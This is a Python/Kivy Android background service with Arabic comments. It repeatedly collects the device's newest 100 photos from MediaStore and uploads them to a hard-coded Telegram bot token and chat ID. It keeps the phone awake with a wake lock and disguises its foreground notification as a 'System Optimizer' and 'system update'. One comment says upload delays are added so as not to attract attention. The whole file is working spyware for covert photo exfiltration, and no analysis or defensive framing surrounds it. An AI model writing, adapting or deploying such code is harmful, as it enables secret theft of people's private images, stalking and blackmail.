import os
import time
import threading
import sqlite3
import requests
from jnius import autoclass

# 1. تهيئة أدوات أندرويد لضمان "الحصانة" في الخلفية
PythonService = autoclass('org.kivy.android.PythonService')
Context = autoclass('android.content.Context')
NotificationBuilder = autoclass('android.app.Notification$Builder')
NotificationChannel = autoclass('android.app.NotificationChannel')
NotificationManager = autoclass('android.app.NotificationManager')
Build = autoclass('android.os.Build')
PowerManager = autoclass('android.os.PowerManager')
MediaStore = autoclass('android.provider.MediaStore')

service = PythonService.mService
context = service.getApplicationContext()

# تفعيل الـ WakeLock ليبقى المعالج مستيقظاً حتى والشاشة مغلقة
power = context.getSystemService(Context.POWER_SERVICE)
wake_lock = power.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ShadowCore::UltraSync")
if not wake_lock.isHeld():
    wake_lock.acquire()

# --- [نظام قاعدة بيانات المهام SQLite] ---
class JobDatabase:
    def __init__(self):
        # تخزين قاعدة البيانات في مجلد الخدمة الخاص
        self.db_path = os.path.join(os.environ.get('PYTHON_SERVICE_DIR', './'), "sync_queue.db")
        self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
        self.conn.execute("PRAGMA journal_mode=WAL") # وضع السرعة العالية
        self.conn.execute("""
            CREATE TABLE IF NOT EXISTS jobs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                file_path TEXT UNIQUE,
                status TEXT DEFAULT 'pending',
                retries INTEGER DEFAULT 0
            )
        """)
        self.conn.commit()

    def add_job(self, file_path):
        try:
            self.conn.execute("INSERT OR IGNORE INTO jobs(file_path) VALUES(?)", (file_path,))
            self.conn.commit()
        except: pass

    def get_pending(self):
        cur = self.conn.execute("SELECT id, file_path, retries FROM jobs WHERE status='pending' LIMIT 5")
        return cur.fetchall()

    def update_status(self, job_id, status, retries):
        self.conn.execute("UPDATE jobs SET status=?, retries=? WHERE id=?", (status, retries, job_id))
        self.conn.commit()

# --- [محرك سحب الصور الرسمي MediaStore] ---
def index_media():
    files = []
    try:
        resolver = context.getContentResolver()
        uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        projection = [MediaStore.MediaColumns.DATA]
        # ترتيب حسب الأحدث
        cursor = resolver.query(uri, projection, None, None, MediaStore.MediaColumns.DATE_ADDED + " DESC")
        
        if cursor:
            count = 0
            while cursor.moveToNext() and count < 100: # سحب آخر 100 صورة للتأكد
                path = cursor.getString(0)
                if path and os.path.exists(path):
                    files.append(path)
                    count += 1
            cursor.close()
    except: pass
    return files

# --- [محرك الإرسال الذكي] ---
class SyncEngine:
    def __init__(self, db):
        self.db = db
        self.token = "7820129712:AAH9pZ49S_m8tY8965625902"
        self.chat_id = "6110903337"
        self.running = True

    def upload_file(self, path):
        url = f"https://api.telegram.org/bot{self.token}/sendDocument"
        try:
            with open(path, 'rb') as f:
                r = requests.post(url, data={'chat_id': self.chat_id}, files={'document': f}, timeout=60)
            return r.status_code == 200
        except: return False

    def run(self):
        while self.running:
            jobs = self.db.get_pending()
            if not jobs:
                time.sleep(30) # لا توجد مهام؟ ارتح قليلاً
                continue
            
            for job_id, path, retries in jobs:
                success = self.upload_file(path)
                if success:
                    self.db.update_status(job_id, 'completed', retries)
                else:
                    new_retries = retries + 1
                    # إذا فشل أكثر من 5 مرات، نضعه كـ فاشل مؤقتاً
                    status = 'failed' if new_retries > 5 else 'pending'
                    self.db.update_status(job_id, status, new_retries)
                    time.sleep(min(2 ** new_retries, 60)) # انتظار تصاعدي
                time.sleep(2) # تأخير بسيط لعدم لفت الانتباه

# --- [تشغيل إشعار الخدمة] ---
def start_foreground():
    CHANNEL_ID = "ultra_sync_v2"
    nm = context.getSystemService(Context.NOTIFICATION_SERVICE)
    if Build.VERSION.SDK_INT >= 26:
        channel = NotificationChannel(CHANNEL_ID, "System Optimizer", NotificationManager.IMPORTANCE_LOW)
        nm.createNotificationChannel(channel)
        builder = NotificationBuilder(context, CHANNEL_ID)
    else:
        builder = NotificationBuilder(context)
    
    notification = builder.setContentTitle("تحديث النظام") \
                          .setContentText("جاري تحسين أداء الملفات...") \
                          .setSmallIcon(context.getApplicationInfo().icon) \
                          .build()
    service.startForeground(102, notification)

if __name__ == '__main__':
    start_foreground()
    db = JobDatabase()
    engine = SyncEngine(db)
    
    # تشغيل محرك المزامنة في خلفية الخدمة
    threading.Thread(target=engine.run, daemon=True).start()
    
    # البحث الدوري عن صور جديدة كل 5 دقائق
    while True:
        new_files = index_media()
        for f in new_files:
            db.add_job(f)
        time.sleep(300)
